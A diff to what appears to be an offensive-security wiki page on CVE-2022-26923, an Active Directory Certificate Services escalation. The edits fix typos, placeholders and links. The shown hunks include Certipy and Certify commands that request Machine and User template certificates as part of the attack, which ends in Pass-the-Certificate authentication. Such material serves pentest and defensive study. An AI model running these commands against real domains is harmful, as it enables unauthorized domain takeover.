@@ -1,5 +1,5 @@
 ---
-title: CVE-2022–26923
+title: CVE-2022-26923
 authors: CravateRouge, ShutdownRepo, sckdev
 category: ad
 ---
@@ -38,7 +38,7 @@ Requesting a certificate based on the `Machine` (or `User`) template can indicat
 This check can be conducted using [Certipy](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ\&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy\&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb) (Python).
 
 ```bash
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template 'User'
 ```
 
 
@@ -124,12 +124,12 @@ The third and last step consists in getting the certificate of the targeted mach
 
 
 ```bash
-certipy req -u 'compter$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine'
+certipy req -u 'computer$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template 'Machine'
 
 ```
 
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 > [!TIP]
 > By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
@@ -143,7 +143,7 @@ Certify.exe request /ca:"domain\ca" /template:"Machine"
 ```
 
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate.
 
 :::
 
